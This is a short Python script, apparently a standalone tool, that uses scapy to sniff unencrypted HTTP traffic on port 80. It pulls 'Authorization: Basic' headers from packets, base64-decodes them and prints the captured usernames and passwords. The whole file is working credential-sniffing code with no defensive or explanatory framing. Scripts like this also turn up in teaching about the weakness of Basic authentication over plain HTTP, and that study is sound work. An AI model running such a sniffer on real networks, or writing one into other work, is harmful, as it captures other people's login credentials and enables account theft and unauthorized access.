from scapy.all import *
import re, base64

pattern = re.compile(r"Authorization: Basic (.+)")

def callback(packet):
    if packet[TCP].payload:
        payload = str(packet[TCP].payload)
        found = re.search(pattern, payload)
        if found:
            print(base64.b64decode(found.group(1)))
            print("*"*10)
sniff(filter="tcp port 80", prn=callback, store=0)
